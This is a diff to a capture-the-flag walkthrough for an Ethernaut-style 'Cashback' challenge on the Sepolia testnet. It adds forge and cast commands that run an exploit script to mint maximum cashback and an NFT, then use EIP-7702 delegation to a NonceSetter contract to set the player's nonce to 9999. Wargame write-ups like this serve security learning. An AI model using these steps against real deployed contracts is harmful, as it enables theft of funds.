@@ -125,9 +125,7 @@ payWithCashback(..., 1 wei)
 
 ## 🧪 Foundry Test
 
-The full exploit is implemented in the Foundry test suite:
-
-[CashbackTest](test/challenge-36-cashback/CashbackTest.t.sol)
+The full exploit is implemented in the Foundry test suite [CashbackTest](../../test/challenge-36-cashback/CashbackTest.t.sol).
 
 The main test:
 
@@ -158,11 +156,30 @@ cast send $(cast az) \
   --rpc-url $SEPOLIA_RPC_URL
 ```
 
+Verify:
+
+```bash
+cast code $PLAYER --rpc-url $SEPOLIA_RPC_URL
+```
+Result:
+
+0x ✅
+
 ---
 
 ## 1 — Attack Cashback
 
+Run the exploit script to mint the maximum cashback for both supported currencies:
+
+- `FREE` cashback: `500 ether`
+- Native cashback: `1 ether`
+
+This step also triggers the mint of the free **Super Cashback NFT**, which is then transferred to the player.
+
 ```bash
+CASHBACK=$CASHBACK \
+LEVEL_ADDRESS=$LEVEL_ADDRESS \
+PLAYER=$PLAYER \
 forge script script/challenge-36-cashback/01_AttackCashback.s.sol:AttackCashbackScript \
   --rpc-url $SEPOLIA_RPC_URL \
   --account ethernaut \
@@ -180,16 +197,24 @@ forge script script/challenge-36-cashback/02_DeployNonceSetter.s.sol:DeployNonce
   --broadcast
 ```
 
+```bash
+NONCE_SETTER=0x15D465A06a8a98545804CA6F144D29A9886Ef4a0
+```
+
 ---
 
-## 3 — Set nonce to 9999
+## 3 — Delegate to NonceSetter and set nonce and set nonce to 9999
 
+Delegate to NonceSetter:
 ```bash
 cast send $(cast az) \
   --auth $NONCE_SETTER \
   --account ethernaut \
   --rpc-url $SEPOLIA_RPC_URL
+```
 
+Set nonce:
+```bash
 cast send $PLAYER \
   "setNonce()" \
   --account ethernaut \
@@ -210,13 +235,19 @@ cast send $(cast az) \
 Verify:
 
 ```bash
-cast code $PLAYER
+cast code $PLAYER --rpc-url $SEPOLIA_RPC_URL
 ```
 
 Expected:
 
 ```
 0xef0100<CASHBACK>
+```
+
+Result:
+
+```
+0xef0100ad76ca049c5305f962efcb1ebfbe2d8526ad6b68 ✅
 ```
 
 ---
